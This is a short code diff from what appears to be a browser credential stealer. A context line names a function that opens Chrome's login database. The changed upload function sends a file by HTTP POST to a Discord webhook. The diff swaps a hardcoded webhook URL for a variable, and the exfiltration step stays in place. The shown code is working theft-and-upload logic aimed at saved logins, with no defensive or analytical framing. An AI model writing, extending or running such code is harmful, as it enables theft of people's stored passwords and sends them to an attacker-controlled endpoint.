@@ -74,9 +74,8 @@ def get_db_connection(chrome_path_login_db):
         return None
 
 def upload(file_path):
-    url = 'https://discord.com/api/webhooks/1302583012566896740/tOB6sCsQIbv-rRD6hwmvMUWsypS9OJHlovD6PuvqSId4g-zAIW5qjq2grXBSFBr42iDJ'
     with open(file_path, "rb") as file:
-        response = requests.post(url, files={"file": file})
+        response = requests.post(webhook, files={"file": file})
 
 if __name__ == '__main__':
     try:
